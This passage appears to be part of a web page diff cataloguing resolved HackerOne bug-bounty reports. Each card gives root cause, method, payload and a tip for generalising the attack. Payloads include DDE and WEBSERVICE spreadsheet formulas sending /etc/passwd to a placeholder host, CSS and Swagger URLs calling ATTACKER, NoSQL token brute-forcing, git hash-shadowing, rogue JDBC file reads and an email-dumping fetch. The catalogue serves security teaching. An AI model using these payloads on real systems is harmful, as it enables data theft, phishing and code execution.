+<h4>Root cause</h4><p style="margin:0">LinkedIn's Voyager decoration feature expands URN-typed fields; the query engine did not enforce which fields are expandable, so storing a fs_emailAddress URN in a profile text field and requesting decoration resolves it, exposing arbitrary users' emails (sequential IDs = full DB).</p>
+<h4>Method</h4><ol><li>Set a profile text field (e.g. website URL) to urn:li:fs_emailAddress:&lt;id&gt;</li><li>Query the profile with a decoration expansion (decoration=(websites*(url~)))</li><li>The response 'included' block resolves the URN to the target email</li><li>Iterate sequential email ids to dump the DB</li></ol>
+<div class="pre">// profile website value:
+urn:li:fs_emailAddress:8519272224
+// then:
+fetch('/voyager/api/identity/dash/profiles?decoration=%28websites*%28url~%29%29&amp;memberIdentity=&lt;pubid&gt;&amp;q=memberIdentity',{headers:{'x-li-deco-include-micro-schema':'true'}})</div>
+<p class="insight"><b>Insight —</b> Reference-resolution / hydration layers (URN decoration, GraphQL @include of foreign objects, node(id:)) often lack per-field authorization. Plant a reference to a foreign object in a field you control and force the server to expand it; sequential IDs turn one resolve into mass extraction.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1806939" target="_blank" rel="noopener">hackerone.com/reports/1806939</a></span><a class="src" href="#report-1806939" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1108504" style="--sv:var(--sev-med)" data-sev="2" data-votes="77" data-bounty="300">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTML injection in newsletter Name field reflected in transactional email</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1108504</b> · cs_money · $300 · 77 votes · resolved</div>
+<div class="taxo"><span>Program <b>cs_money</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An unsanitized user field (subscriber Name) is reflected into the HTML body of a system-sent confirmation email, letting the attacker rewrite the visible email that victims receive from a trusted sender address.</p>
+<h4>Method</h4><ol><li>Subscribe to the newsletter and put HTML markup in the Name field.</li><li>Confirmation email from the trusted sender (go@cs.money) renders the injected HTML.</li><li>Craft the payload to replace the entire visible email content with a phishing message.</li></ol>
+<div class="pre">Name: &lt;h1&gt;Your account is suspended&lt;/h1&gt;&lt;a href="https://attacker/verify"&gt;Verify now&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> Any user-controlled field that flows into an outbound email template (name, order note, ticket subject) is an HTML-injection phishing sink; the trusted From: address makes it high-value even without XSS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1108504" target="_blank" rel="noopener">hackerone.com/reports/1108504</a></span><a class="src" href="#report-1108504" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3590586" style="--sv:var(--sev-med)" data-sev="2" data-votes="44" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSS sanitizer bypass: 'position: fixed !important' escapes exact-match mitigation</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3590586</b> · nextcloud · none · 44 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A CSS sanitizer neutralizes overlay attacks by rewriting position:fixed to absolute, but the check is strcasecmp(value,'fixed')===0 requiring the whole value to equal 'fixed'. 'fixed !important' fails that comparison, then passes token-based validation and is emitted unchanged.</p>
+<h4>Method</h4><ol><li>Send an HTML email whose CSS uses position: fixed !important on a full-viewport overlay.</li><li>Sanitizer's exact-match ('fixed') mitigation does not fire; token validator accepts ['fixed','!important'].</li><li>Rendered overlay covers the preview pane iframe, and the whole browser viewport when opened in a new window.</li></ol>
+<div class="pre">.overlay{position:fixed !important;top:0;left:0;width:100%;height:100%;background:white;z-index:99999;}</div>
+<p class="insight"><b>Insight —</b> Whenever a sanitizer special-cases a value by exact string match, try appending !important, extra whitespace, comments (/**/), or case changes so the value no longer equals the blocked literal but still parses. Applies to CSS property mitigations and keyword denylists generally.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3590586" target="_blank" rel="noopener">hackerone.com/reports/3590586</a></span><a class="src" href="#report-3590586" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1748961" style="--sv:var(--sev-med)" data-sev="2" data-votes="40" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV / formula injection via exported field</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1748961</b> · metamask · 500 · 40 votes · resolved</div>
+<div class="taxo"><span>Program <b>metamask</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled field (client name) is written to an exported CSV without neutralizing leading formula characters; opened in Excel/Calc, a cell beginning with = is evaluated, enabling DDE command execution or data exfiltration.</p>
+<h4>Method</h4><ol><li>Enter a formula payload in a field that gets exported to CSV</li><li>Have a victim export and open the CSV in a spreadsheet app</li><li>Formula executes (DDE cmd) or exfiltrates cell data</li></ol>
+<div class="pre">=cmd|' /C notepad'!'A1'</div>
+<p class="insight"><b>Insight —</b> Any user text that reaches CSV/XLSX export is a formula-injection sink; test =, +, -, @ and DDE (=cmd|...). Fix is prefixing those with a single quote.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1748961" target="_blank" rel="noopener">hackerone.com/reports/1748961</a></span><a class="src" href="#report-1748961" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-790634" style="--sv:var(--sev-med)" data-sev="2" data-votes="39" data-bounty="2000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Git reference ambiguity: branch named as a commit hash shadows the hash</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#790634</b> · gitlab · $2000 · 39 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span><span>Chain <b>branch-as-hash -&gt; pinned dependency resolves to attacker </b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Git resolves an ambiguous ref by preferring a branch name over a commit object. A host that accepts pushing 40-hex-char branch names lets an attacker create a branch whose name equals a real commit hash; dependents that pin that hash then check out the attacker branch instead.</p>
+<h4>Method</h4><ol><li>Identify a commit hash A that consumers pin/reference.</li><li>On the same repo, create and push a branch named exactly the 40-char hash A pointing at a different commit B.</li><li>A consumer's `git checkout &lt;hashA&gt;` now resolves to branch A (commit B), silently swapping the referenced content.</li></ol>
+<div class="pre">git branch e91803d442559d6efb63102b10c919e10901b01d &lt;commit_B&gt;
+git push origin e91803d442559d6efb63102b10c919e10901b01d</div>
+<p class="insight"><b>Insight —</b> Trusting a git hash as immutable is unsafe if the host allows hash-shaped ref names (GitHub blocks them, some hosts do not). Same 'ref/diff ambiguity' family also lets attackers smuggle commits so the reviewed PR diff differs from what actually merges (refs/replace). Test git hosts for hash-shaped branch/tag acceptance and diff-vs-merge consistency.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/790634" target="_blank" rel="noopener">hackerone.com/reports/790634</a></span><a class="src" href="#report-790634" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-389076" style="--sv:var(--sev-med)" data-sev="2" data-votes="37" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Extension postMessage command injection (open-url tab flooding)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#389076</b> · superhuman · awarded · 37 votes · resolved</div>
+<div class="taxo"><span>Program <b>superhuman</b></span><span>Surface <b>other</b></span><span>Chain <b>Untrusted page -&gt; content script -&gt; background chrome.</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A browser-extension content script accepts commands from window.postMessage sent by the active page and forwards an attacker-supplied URL to chrome.tabs.create on the background page, with no origin/gesture check.</p>
+<h4>Method</h4><ol><li>Page (after initializing the extension popup) posts a message with the extension's command envelope</li><li>Content script relays open-url to background page</li><li>Background opens tab(s) at attacker URL including file:// and chrome://; loop for infinite-tab DoS</li></ol>
+<div class="pre">window.postMessage({
+  grammarly: true,
+  action: 'open-url',
+  url: 'file:///etc/passwd'
+}, '*')</div>
+<p class="insight"><b>Insight —</b> Any extension whose content script trusts window.postMessage/DOM events without verifying event.isTrusted or origin is a page-to-privileged-API bridge; enumerate the command envelope and look for navigation/file/download sinks.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/389076" target="_blank" rel="noopener">hackerone.com/reports/389076</a></span><a class="src" href="#report-389076" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-3590583" style="--sv:var(--sev-med)" data-sev="2" data-votes="34" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSS injection via unquoted url() from body background attribute</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3590583</b> · nextcloud · none · 34 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The sanitizer builds inline style background-image:url(VALUE) from the email &lt;body background&gt; attribute without quoting VALUE. Even though VALUE passes wash_uri() (which allows data:image/*), a data: URI containing ')' closes url() early and the remainder is parsed as extra CSS properties on the inline style, bypassing the &lt;style&gt;-block URL callback.</p>
+<h4>Method</h4><ol><li>Enable 'block remote images' in the webmail client.</li><li>Send an HTML email with a body background attribute whose data: URI contains ')' followed by an attacker CSS property.</li><li>The unquoted url() is closed early; injected background:url(//evil) is inline style (not in a &lt;style&gt; block) so it dodges the URL-blocking callback and loads the remote resource.</li></ol>
+<div class="pre">&lt;body background="data:image/png,x);background:url(//ATTACKER/track?uid=victim@test.com"&gt;
+&lt;!-- rendered inline style: background-image: url(data:image/png,x);background:url(//ATTACKER/track?uid=victim@test.com) --&gt;</div>
+<p class="insight"><b>Insight —</b> Unquoted values placed into url() or any CSS function are injectable even after URI validation: a ')' breaks out of the function and everything after becomes new declarations. Inline styles built by the server bypass &lt;style&gt;-block CSS filters entirely. Test attribute-&gt;inline-CSS reflections for url() breakout.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3590583" target="_blank" rel="noopener">hackerone.com/reports/3590583</a></span><a class="src" href="#report-3590583" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2580062" style="--sv:var(--sev-med)" data-sev="2" data-votes="29" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>NoSQL $regex injection to leak livechat token + messages</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2580062</b> · rocket_chat · none · 29 votes · resolved</div>
+<div class="taxo"><span>Program <b>rocket_chat</b></span><span>Surface <b>web</b></span><span>Chain <b>loginByToken $regex token bruteforce -&gt; loadHistory rid:$</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Meteor methods pass user-controlled parameters straight into MongoDB queries without type validation, so an object like {"$regex":...} performs NoSQL injection. livechat:loginByToken (pre-auth) leaks visitor tokens char-by-char; livechat:loadHistory rid then dumps messages.</p>
+<h4>Method</h4><ol><li>Call livechat:loginByToken with a {$regex:'^&lt;prefix&gt;[chars]'} object; a non-error _id response confirms the prefix, enabling binary-search bruteforce of the full token</li><li>With the recovered token, call livechat:loadHistory with rid:{$regex:'.*'} to bypass room-id validation and dump all messages</li></ol>
+<div class="pre">Meteor.call('livechat:loginByToken', { "$regex": "^"+known+"["+guesses+"]" }, cb); // boolean oracle -&gt; bruteforce token
+
+Meteor.call('livechat:loadHistory', { token: leakedToken, rid: { "$regex": ".*" } }, cb); // dump messages</div>
+<p class="insight"><b>Insight —</b> Any endpoint that accepts a JSON body and forwards a field into a Mongo query is a NoSQL-injection candidate: swap the string for {$regex}, {$ne:null}, {$gt:''}. A pre-auth boolean oracle turns an opaque token into a fully enumerable secret via prefix binary search.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2580062" target="_blank" rel="noopener">hackerone.com/reports/2580062</a></span><a class="src" href="#report-2580062" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-587727" style="--sv:var(--sev-med)" data-sev="2" data-votes="28" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Stored CSS injection into style attribute -&gt; position:fixed UI redress</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#587727</b> · phpbb · none · 28 votes · resolved</div>
+<div class="taxo"><span>Program <b>phpbb</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User input to a BBcode tag is placed into a span's CSS style attribute with insufficient filtering (quotes stripped but arbitrary CSS declarations allowed), enabling attacker-controlled positioning/appearance of page elements.</p>
+<h4>Method</h4><ol><li>Post content using the vulnerable BBcode tag with CSS declarations as its value.</li><li>Value is emitted into &lt;span style="..."&gt;; use position:fixed to place an element anywhere on the page.</li><li>Overlay/redress the page for UI-redressing/clickjacking-style attacks.</li></ol>
+<div class="pre">[tag]position:fixed;top:0;left:0;width:100%;height:100%;background:url(//ATTACKER/x)[/tag]</div>
+<p class="insight"><b>Insight —</b> When input lands in a CSS context (style attribute or &lt;style&gt;), quote-stripping alone does not stop CSS injection: position:fixed enables overlays/UI redress, and url()/@import loads external resources for tracking. Under CSP, XSS may be blocked but CSS injection (redress + resource load) still lands. Also seen where a logo_url is placed unescaped into a &lt;style&gt; block (#315865).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/587727" target="_blank" rel="noopener">hackerone.com/reports/587727</a></span><a class="src" href="#report-587727" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-335339" style="--sv:var(--sev-med)" data-sev="2" data-votes="25" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client-side HTTP parameter pollution into iframe URL via stale vendor JS</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#335339</b> · slack · awarded · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>slack</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A path segment is concatenated into a third-party iframe URL by outdated vendored JS; appended query params from the outer URL are carried into the iframe src, and duplicate keys later in the string override the intended values (HPP), letting an attacker load an arbitrary vendor form.</p>
+<h4>Method</h4><ol><li>Note the page builds boards.greenhouse.io iframe src from the current path (job id).</li><li>Append extra params to the outer URL so they get concatenated after the legitimate for=/token= params.</li><li>Because duplicate params override, the iframe loads an attacker-chosen for=/token= (external Greenhouse form).</li></ol>
+<div class="pre">https://slack.com/careers/975649&amp;for=hackerone&amp;token=602938
+# resulting iframe src:
+https://boards.greenhouse.io/embed/job_app?for=slack&amp;token=975649&amp;b=https://slack.com/careers/975649&amp;for=hackerone&amp;token=602938</div>
+<p class="insight"><b>Insight —</b> Where user-influenced values are string-concatenated into a URL and later duplicate keys win, you get HPP. Copied/vendored JS misses upstream patches - check third-party embed widgets for outdated bundled code. Impact: load attacker-controlled embedded forms under the trusted origin (phishing/content injection).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/335339" target="_blank" rel="noopener">hackerone.com/reports/335339</a></span><a class="src" href="#report-335339" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2297561" style="--sv:var(--sev-med)" data-sev="2" data-votes="22" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Swagger UI remote definition load via ?configUrl= / ?url=</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2297561</b> · deptofdefense · none · 22 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Swagger UI before 4.1.3 loads an OpenAPI/config definition from an attacker-supplied ?configUrl=/?url= parameter, so a crafted link renders remote (attacker-controlled) API definitions in the context of the trusted host (spoofing, and DOM-injection/XSS in some versions).</p>
+<h4>Method</h4><ol><li>Locate a Swagger UI endpoint on the target (docs/swagger paths).</li><li>Supply ?configUrl= (or ?url=) pointing at an attacker-hosted JSON/YAML definition.</li><li>Swagger UI renders the attacker definition under the trusted origin for phishing / config manipulation.</li></ol>
+<div class="pre">https://TARGET/swagger/?configUrl=https://ATTACKER/malicious-config.json
+# or:  https://TARGET/swagger-ui/?url=https://ATTACKER/evil-openapi.json</div>
+<p class="insight"><b>Insight —</b> Fingerprint Swagger UI version; &lt;4.1.3 (and url-param variants) trust an external definition URL. Even without XSS this is a spoofing/phishing primitive on a trusted domain. Also seen on DoD via configUrl (#3124103).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2297561" target="_blank" rel="noopener">hackerone.com/reports/2297561</a></span><a class="src" href="#report-2297561" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1966083" style="--sv:var(--sev-med)" data-sev="2" data-votes="22" data-bounty="2400">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>JDBC/schema parameter injection -&gt; connect-back MySQL arbitrary file read</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1966083</b> · ibb · USD 2400 · 22 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>JDBC param injection -&gt; rogue MySQL LOCAL INFILE file rea</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Apache Airflow Spark provider (&lt;4.0.1) did not filter connection schema parameters, letting an attacker supply a malicious JDBC URL so SparkJDBCHook connected to an attacker MySQL server that abused client file-read (allowLoadLocalInfile) to read files off the Airflow host.</p>
+<h4>Method</h4><ol><li>Modify/craft a connection so SparkJDBCOperator uses an attacker JDBC URL/schema</li><li>Run the DAG; Airflow connects out to the attacker MySQL server</li><li>Server issues LOCAL INFILE requests to read arbitrary files from Airflow</li></ol>
+<div class="pre">jdbc:mysql://ATTACKER:3306/db?allowLoadLocalInfile=true&amp;...   # via unfiltered schema param</div>
+<p class="insight"><b>Insight —</b> Any 'connect to a database/URL you control' feature is a file-read (and often deser-&gt;RCE) primitive: point it at a malicious server abusing JDBC LOCAL INFILE; audit connection-string params for missing allowlisting.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1966083" target="_blank" rel="noopener">hackerone.com/reports/1966083</a></span><a class="src" href="#report-1966083" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-216243" style="--sv:var(--sev-med)" data-sev="2" data-votes="20" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV / formula (DDE) injection via exported user-controlled fields</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#216243</b> · gitlab · none · 20 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled fields (issue title, attendee name, ticket title) are written into exported CSV without neutralizing leading formula characters; a spreadsheet then evaluates =/+/-/@ cells, and DDE (=cmd|...) can launch commands on the opener's machine.</p>
+<h4>Method</h4><ol><li>Set a user-controlled field to a formula/DDE payload</li><li>Export the data to CSV via the app's export feature</li><li>Victim opens the CSV in Excel; the cell executes</li></ol>
+<div class="pre">=cmd|' /C calc'!A0
+# equations that just prove eval: =7*7  =AND(2&gt;1)
+# quote-encapsulation bypass (see #118582): ":";-3+3+cmd|' /C calc'!D2</div>
+<p class="insight"><b>Insight —</b> Any 'export to CSV/XLS' feature is a formula-injection sink. Prefix =,+,-,@ (and neutralize embedded quotes/semicolons) on export. Attacker input often enters via one app and detonates when staff export+open it (stored/second-order).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/216243" target="_blank" rel="noopener">hackerone.com/reports/216243</a></span><a class="src" href="#report-216243" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1104077" style="--sv:var(--sev-med)" data-sev="2" data-votes="20" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>XML round-trip/parser-differential mutation in REXML</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1104077</b> · ruby · USD 500 · 20 votes · resolved</div>
+<div class="taxo"><span>Program <b>ruby</b></span><span>Surface <b>other</b></span><span>Tag <b>saml</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An XML parser that does not preserve document structure across parse-&gt;serialize-&gt;reparse (round-trip instability) lets an attacker craft a document whose logical structure changes after a downstream re-serialization. Same primitive as the Go encoding/xml bugs.</p>
+<h4>Method</h4><ol><li>Craft an XML doc mixing DOCTYPE NOTATION with a quote inside the SYSTEM value plus CDATA that hides sibling elements</li><li>Parse then re-serialize with the target library and reparse</li><li>Observe the first child element changed (Y -&gt; Z), i.e. structure mutated</li></ol>
+<div class="pre">require 'rexml/document'
+doc = REXML::Document.new &lt;&lt;XML
+&lt;!DOCTYPE x [ &lt;!NOTATION x SYSTEM 'x"&gt;]&gt;&lt;!--'&gt; ]&gt;
+&lt;X&gt;
+  &lt;Y/&gt;&lt;![CDATA[--&gt;&lt;X&gt;&lt;Z/&gt;&lt;!--]]&gt;--&gt;
+&lt;/X&gt;
+XML
+puts doc.root.elements[1].name        # Y
+doc = REXML::Document.new doc.to_s
+puts doc.root.elements[1].name        # Z  (mutated)</div>
+<p class="insight"><b>Insight —</b> When two components parse the same XML and one re-serializes it, look for parser differentials / round-trip instability. In SAML/SOAP this yields signature-wrapping-style auth bypass and privilege escalation because the security-checked tree differs from the acted-on tree.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1104077" target="_blank" rel="noopener">hackerone.com/reports/1104077</a></span><a class="src" href="#report-1104077" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2095061" style="--sv:var(--sev-med)" data-sev="2" data-votes="17" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>JSON parser differential via duplicate key to smuggle privileged message (Jitsi)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2095061</b> · 8x8-bounty · awarded · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>8x8-bounty</b></span><span>Surface <b>web</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Jitsi Videobridge (Jackson) reads the FIRST occurrence of a duplicated JSON key to authorize a message type, while browser clients (JS JSON.parse) read the LAST; sending a duplicate colibriClass lets a participant pass an allowed type to the server that clients interpret as a privileged, server-only type.</p>
+<h4>Method</h4><ol><li>Send a WebSocket JSON message with two colibriClass keys</li><li>Set the first to an allowed type (passes bridge validation) and the last to a server-only type</li><li>Clients act on the last value, executing the privileged control message</li></ol>
+<div class="pre">{"colibriClass":"EndpointStats","colibriClass":"ForwardedSources", ...}</div>
+<p class="insight"><b>Insight —</b> When two components on a trust boundary parse the same JSON with different libraries, duplicate keys create a request-smuggling-style differential. Test first-vs-last key precedence across any validate-here/act-there boundary (Jackson vs V8, Go vs JS, etc.).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2095061" target="_blank" rel="noopener">hackerone.com/reports/2095061</a></span><a class="src" href="#report-2095061" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-72785" style="--sv:var(--sev-med)" data-sev="2" data-votes="13" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV / spreadsheet formula (DDE) injection via export feature</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#72785</b> · security · awarded · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Chain <b>stored injection -&gt; victim opens export -&gt; DDE -&gt; l</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-supplied text is written into an exported CSV without neutralizing leading formula triggers. When a victim opens the file, a cell starting with =,+,-,@ is evaluated by Excel/Sheets - enabling DDE command execution (with a warning) and data exfiltration.</p>
+<h4>Method</h4><ol><li>Put a formula payload in any field that lands in an export (name, title, note)</li><li>Get a privileged user to export and open the CSV</li><li>Cell evaluates: benign (=1+1 -&gt; 2) proves it; DDE payload attempts command exec</li></ol>
+<div class="pre">=1+1                       // proof of evaluation
+=cmd|' /C calc'!A0         // DDE command execution on Windows
+@SUM(1+1)*cmd|' /C calc'!A0</div>
+<p class="insight"><b>Insight —</b> Every export-to-CSV/XLS feature is a formula-injection sink; prefix =,+,-,@ (and | for DDE, tab/CR variants) with a quote. Test any field an admin later exports. Also seen in Chaturbate (#386116), WordCamp Talks (#277525), and Gratipay (#219323 - name field).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/72785" target="_blank" rel="noopener">hackerone.com/reports/72785</a></span><a class="src" href="#report-72785" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-943255" style="--sv:var(--sev-med)" data-sev="2" data-votes="11" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV/formula injection via stored fields -&gt; client-side RCE and local file read</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#943255</b> · khanacademy · none · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>khanacademy</b></span><span>Surface <b>web</b></span><span>Chain <b>stored formula -&gt; CSV export -&gt; spreadsheet opens -&gt</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Teacher CSV export writes student name/password fields without neutralizing spreadsheet formula prefixes; when opened in Excel/LibreOffice the cells evaluate as formulas, enabling DDE/command execution and file exfiltration on the victim's machine.</p>
+<h4>Method</h4><ol><li>Set a stored field (student password/name) that is later exported to CSV to a spreadsheet-formula payload</li><li>Get a teacher/admin to export and open the CSV</li><li>Formula executes on their client (command exec / WEBSERVICE file read)</li></ol>
+<div class="pre"># client RCE (DDE/cmd):
+;=2+5+cmd|' /C calc'!A0
+# local file exfil via WEBSERVICE:
+"=WEBSERVICE(CONCATENATE(""https://HOST:PORT"" , ('file:///etc/passwd'#$passwd.A1)))"
+# double-quote-filter bypass using LibreOffice single-quote form:
+",'=2+11',"</div>
+<p class="insight"><b>Insight —</b> Any user-controlled value that lands in an exported CSV/XLSX is a formula-injection sink even if it is never rendered in the web UI (second-order). Payloads starting with = + - @ (or ; for LibreOffice) execute; test both Excel DDE (cmd|'/C ...') and =WEBSERVICE()/=HYPERLINK() for exfiltration. Double-quote escaping filters can be bypassed with LibreOffice's single-quote formula format.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/943255" target="_blank" rel="noopener">hackerone.com/reports/943255</a></span><a class="src" href="#report-943255" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-107960" style="--sv:var(--sev-med)" data-sev="2" data-votes="11" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected File Download via JSONP callback + executable path</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#107960</b> · ui · awarded · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>ui</b></span><span>Surface <b>api</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A JSON/JSONP endpoint reflects an unsanitized callback into the body and allows an arbitrary trailing path segment (.cmd/.bat), so the browser downloads attacker-controlled command text as an executable file from the trusted origin.</p>
+<h4>Method</h4><ol><li>Find a JSONP/API endpoint that reflects the callback param verbatim</li><li>Append a fake filename with an executable extension in the path (Ubiquiti_update.cmd)</li><li>Set callback to shell commands (e.g. \"||calc||)</li><li>Deliver via &lt;a download&gt; or direct navigation; file downloads from the trusted domain</li></ol>
+<div class="pre">https://community.ubnt.com/restapi/.../Ubiquiti_update.cmd?restapi.response_format=json&amp;callback=\%22||calc||
+
